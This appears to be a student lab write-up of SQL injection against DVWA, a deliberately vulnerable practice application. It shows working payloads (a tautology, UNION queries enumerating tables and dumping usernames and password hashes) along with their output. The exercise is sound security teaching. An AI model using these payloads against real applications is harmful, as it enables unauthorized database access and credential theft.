# PROGRAM – 04

## Experiment 4: SQL Injection Attack on Web Application

### Use SQL Injection on DVWA Page to Enumerate Database, Tables, and Credentials

## Solution

### Step 1: Open DVWA Web Page by the following commands
```text
systemctl start apache2
```
```text
systemctl start mysql
```

- Select DVWA Security to:

```text
low
```

- Type the following command in the ID field to enumerate the web page in SQL injection page:

```sql
' or 1=1#
```

### Output

```text
ID: ' or 1=1#
First name: admin
Surname: admin
```

```text
ID: ' or 1=1#
First name: Gordon
Surname: Brown
```

```text
ID: ' or 1=1#
First name: Hack
Surname: Me
```

```text
ID: ' or 1=1#
First name: Pablo
Surname: Picasso
```

```text
ID: ' or 1=1#
First name: Bob
Surname: Smith
```

## Enumerate Table Names

Type:

```sql
' union select table_name,null from information_schema.tables #
```

### Sample Output

```text
COLLATION_CHARACTER_SET_APPLICABILITY
```

```text
COLUMNS
```

```text
COLUMN_PRIVILEGES
```

## Enumerate Usernames and Password Hashes

Type:

```sql
' UNION select user,password from users#
```

### Output

```text
ID: 'UNION select user,password from users#
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

```text
ID: 'UNION select user,password from users#
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03
```

```text
ID: 'UNION select user,password from users#
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
```

## Result

Successfully performed SQL Injection on the DVWA application and observed database records, table names, and stored credential hashes.
